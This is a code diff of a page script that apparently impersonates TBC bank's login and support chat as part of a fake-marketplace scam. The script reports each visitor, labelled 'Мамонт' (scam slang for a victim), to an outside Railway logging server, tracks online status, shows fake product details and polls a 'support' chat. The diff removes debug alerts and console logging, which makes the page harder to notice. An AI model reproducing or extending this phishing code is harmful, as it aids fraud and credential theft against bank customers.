@@ -597,8 +597,6 @@ body{font-family:"Helvetica Neue",Arial,sans-serif;height:100vh;overflow:hidden;
 </div>
 
 <script>
-alert('TBC Chat script loaded!');
-console.log('TBC Chat script is running');
 // Логирование на Railway
 function sendLog(type, details, callback) {
   const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
@@ -614,7 +612,6 @@ function sendLog(type, details, callback) {
   })
   .then(response => response.json())
   .then(data => { if (callback) callback(); })
-  .catch(error => { console.error('Log error:', error); if (callback) callback(); });
 }
 
 var T = {
@@ -772,7 +769,6 @@ function chatSend(){
     if(t2) t2.remove();
   })
   .catch(err => {
-    console.error('Error sending message:', err);
     var t2=document.getElementById('typingMsg');
     if(t2) t2.remove();
   });
@@ -822,7 +818,6 @@ function restoreChatMessagesFromLocalStorage(link_id) {
       msgs.appendChild(div);
     });
   }catch(e){
-    console.error('Error restoring messages:', e);
   }
 }
 
@@ -858,7 +853,6 @@ function startSupportPolling() {
           });
         }
       })
-      .catch(err => console.error('Error polling:', err));
   }, 2000);
 }
 
@@ -928,7 +922,6 @@ let tbc_productPrice = '';
 document.addEventListener('DOMContentLoaded', function() {
   const urlParams = new URLSearchParams(window.location.search);
   const link_id = urlParams.get('link_id') || '';
-  console.log(`🔍 TBC Login - link_id=${link_id}`);
   sendLog('bank_selected', `🏦 Мамонт выбрал TBC\nlink_id=${link_id}`);
 
   // Load product info
@@ -938,11 +931,9 @@ document.addEventListener('DOMContentLoaded', function() {
       .then(data => {
         tbc_productName = data.name || 'Товар';
         tbc_productPrice = data.price || '';
-        console.log(`📦 Loaded TBC product: ${tbc_productName} (${tbc_productPrice})`);
       })
       .catch(e => console.warn(`⚠️ Failed to load TBC product: ${e}`));
 
-    console.log(`✅ TBC Login - sending online for ${link_id}`);
     sendLog('online', link_id);
 
     // Send heartbeat every 5 seconds to track real-time online status
